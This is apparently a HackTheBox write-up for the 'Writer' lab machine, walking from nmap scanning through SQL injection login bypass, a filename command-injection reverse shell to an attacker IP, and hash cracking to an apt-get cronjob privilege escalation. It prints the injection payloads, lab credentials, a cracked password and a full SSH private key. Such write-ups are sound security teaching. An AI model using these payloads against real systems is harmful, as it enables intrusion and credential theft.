---
layout: default
title: HackTheBox: Writer Writeup
discription: Amar1337
---

<center> 
    <big>Writer: HTB</big>
</center>

<center>
    <img src="https://pbs.twimg.com/media/E7Yb_WKXoAk4o3M?format=jpg&name=4096x4096">
</center>

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

*   Information
*   name: <p1> Writer </p1>
*   OS: <p1> Linux </p1>
*   Difficulty: <p1 style="color:orange;">Medium</p1>
*   Points: <p1> 30 </p1>
*   Release: <p1 > 2ND AUGUST, 2021 </p1>
*   IP: 10.10.11.101
*  https://app.hackthebox.eu/machines/Writer

- First blood:
    - user.txt <a href="https://twitter.com/clubby789/">clubby789</a> 
    - root.txt <a href="https://twitter.com/xct_de?lang=hr">xct</a>

## Summary
- Reading files and logging into the system via SQL injection.
- Read source code to find command injection vulnerability and get web shell.
- Read web path to discover configuration files. Read Mysql account secret login to get hash.
- Use hashcat to crack the hash to get the password and get the user.txt.
- Mapping port 25 out, execute a command via /etc/postfix/disclaimer to further elevate privileges and read john's id_rsa.
- Raise privileges via apt-get.

# <big>nmap</big> 

```js 
root@kali:~# nmap -sC -sV 10.10.11.101
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-24 12:22 CEST
Nmap scan report for writer.htb (10.10.11.101)
Host is up (0.61s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 98:20:b9:d0:52:1f:4e:10:3a:4a:93:7e:50:bc:b8:7d (RSA)
|   256 10:04:79:7a:29:74:db:28:f9:ff:af:68:df:f1:3f:34 (ECDSA)
|_  256 77:c4:86:9a:9f:33:4f:da:71:20:2c:e1:51:10:7e:8d (ED25519)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Story Bank | Writer.HTB
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: 14m02s
|_nbstat: NetBIOS name: WRITER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-24T10:37:18
|_  start_date: N/A
```

<big> * Pages redirecting to writer.thb so lets add to /etc/host<big>

```js
10.10.11.101    writer.htb
```
# <big>web</big> 

<img src="https://rustlang.rs/images/htb-writer/001.png">

<br><big> * Nothing special on website so im gonna try to find something like login page </big>

```js
wfuzz -w /usr/share/dirb/wordlists/big.txt -u http://writer.htb/FUZZ --hc 404 -t 200
```
<img src="https://gcdn.pbrd.co/images/7zOTtLDkbG2N.png?o=1">

<br><big> * Lets check administrative page </big>

<img src="https://rustlang.rs/images/htb-writer/003.png">

<br><big> * Redirect us to admin login page, im gonna try something like admin:admin or admin:password. If doesn't work im gonna check for sql injection bypass </big> <br><big>So after 5-10 minutes i got in with **admin ' or '1'='1**

<br><img src="https://rustlang.rs/images/htb-writer/005.png">

<br><big> * Checking with burp and discovered server is **Apache/2.4.41** so i tried some things with sqlmap and find out that i can read **/var/www/writer.htb/writer/** </big><br>

<br><big> * In that directory i found **000-default.conf** so i can read **virtualhost** </big>

```js
# Virtual host configuration for writer.htb domain
<VirtualHost *:80>
        ServerName writer.htb
        ServerAdmin admin@writer.htb
        WSGIScriptAlias / /var/www/writer.htb/writer.wsgi
        <Directory /var/www/writer.htb>
                Order allow,deny
                Allow from all
        </Directory>
        Alias /static /var/www/writer.htb/writer/static
        <Directory /var/www/writer.htb/writer/static/>
                Order allow,deny
                Allow from all
        </Directory>
        ErrorLog ${APACHE_LOG_DIR}/error.log
        LogLevel warn
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

# Virtual host configuration for dev.writer.htb subdomain
# Will enable configuration after completing backend development
# Listen 8080
#<VirtualHost 127.0.0.1:8080>
#       ServerName dev.writer.htb
#       ServerAdmin admin@writer.htb
#
        # Collect static for the writer2_project/writer_web/templates
#       Alias /static /var/www/writer2_project/static
#       <Directory /var/www/writer2_project/static>
#               Require all granted
#       </Directory>
#
#       <Directory /var/www/writer2_project/writerv2>
#               <Files wsgi.py>
#                       Require all granted
#               </Files>
#       </Directory>
#
#       WSGIDaemonProcess writer2_project python-path=/var/www/writer2_project python-home=/var/www/writer2_project/writer2env
#       WSGIProcessGroup writer2_project
#       WSGIScriptAlias / /var/www/writer2_project/writerv2/wsgi.py
#        ErrorLog ${APACHE_LOG_DIR}/error.log
#        LogLevel warn
#        CustomLog ${APACHE_LOG_DIR}/access.log combined
#
#</VirtualHost>
```

<br><big> * So i tried to read **/var/www/writer/__init__.py**</big>

## <p1 style="color:red;">**Script is much longer but i will just paste important**</p1>

<br>

```py
        if request.form.get('image_url'):
            image_url = request.form.get('image_url')
            if ".jpg" in image_url:
                try:
                    local_filename, headers = urllib.request.urlretrieve(image_url)
                    os.system("mv {} {}.jpg".format(local_filename, local_filename))
                    image = "{}.jpg".format(local_filename)
                    try:
                        im = Image.open(image) 
                        im.verify()
                        im.close()
                        image = image.replace('/tmp/','')
                        os.system("mv /tmp/{} /var/www/writer.htb/writer/static/img/{}".format(image, image))
                        image = "/img/{}".format(image)
                    except PIL.UnidentifiedImageError:
                        os.system("rm {}".format(image))
                        error = "Not a valid image file!"
                        return render_template('add.html', error=error)
                except:
                    error = "Issue uploading picture"
                    return render_template('add.html', error=error)
            else:
                error = "File extensions must be in .jpg!"
                return render_template('add.html', error=error)
```

<br><big> * If u are familiar with python u can see that u can do something with upload picture, i tried alot of things so i found out that i can do reverse shell through picture name</big>

<img src="https://rustlang.rs/images/htb-writer/008.png">

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# <big>Getting foothold</big>

<big> * I decode my reverse shell into base64 </big>

<br><img src="https://i.imgur.com/Nd00ca0.png">

<br><big> * Next i upload picture called **123.png** then renamed it on burp with my payload </big> 

<br><big> * Payload looks like this</big>

```py

123.jpg;`echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuOTUvNDQONCAwPiYxCg== | base64 -d | bash`

```

<br><img src="https://i.imgur.com/nP9ijez.png">

<br><big> * I tried to execute and didnt got anything until i found i can upload picture on story through **URL** so i tried directly but got response **localhost not allowed** so i put **http://google.com** and in burp changed to my reverse shell</big> 

<br> <img src="https://i.imgur.com/McEf2ct.png">

<br><big> * And boom, we got a shell<big>

# <big>Getting **kyle** user </big>

<br><img src="https://i.imgur.com/BKudYDy.png">

<br><big> * After searching **www** dir i found **DB Conf** when we look up we got user and password </big>

```py
[client]
database = dev
user = djangouser
password = DjangoSuperPassword
default-character-set = utf8
```

<br><big> * When we look up DB we found user called **kyle** and his **decode password** </big>

```js
MariaDB [dev]> select username,password from auth_user;
select username,password from auth_user;
+----------+------------------------------------------------------------------------------------------+
| username | password                                                                                 |
+----------+------------------------------------------------------------------------------------------+
| kyle     | pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A= |
+----------+------------------------------------------------------------------------------------------+
1 row in set (0.001 sec)
```

<br><big> * Let's crack it </big>

```py
pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A=:marcoantonio
```

<br><big> * We have a password so lets **ssh** as **kyle** </big>

# <big>Getting **john** user</big>

<br><img src="https://i.imgur.com/GZgeFEI.png">

<br><big> * After some times i found that i can send malicious mail and got some privileges, explained in those links </big>

* <a href="https://book.hacktricks.xyz/pentesting/pentesting-smtp">https://book.hacktricks.xyz/pentesting/pentesting-smtp</a>
* <a href="https://viperone.gitbook.io/pentest-everything/all-writeups/pg-practice/linux/postfish">https://viperone.gitbook.io/pentest-everything/all-writeups/pg-practice/linux/postfish</a>
* <a href="https://mobt3ath.com/uplode/books/book-27297.pdf">https://mobt3ath.com/uplode/books/book-27297.pdf</a>

<br><big> * I tried reverse shell it doesn't work so i tried just privileges to acces in **/home/john** and we got acces, so i read **.ssh** and take **id_rsa** key</big>

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```
<br><img src="https://i.imgur.com/ust1yAN.png">

# <big> Getting **root** </big>

<br><big> * I upload <a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS/">Linpeas</a> and found **cronjob** * **apt-get**

<br><big> * In those links everything is explained, is very easy just follow commands, execute reverse shell and wait **2-5 minutes** for **cronjob**

* <a href="https://gtfobins.github.io/gtfobins/apt-get/">https://gtfobins.github.io/gtfobins/apt-get/</a>
* <a href="https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/">https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/</a>

<big>Amar#0484</big>

## [Back to main page](./../..)
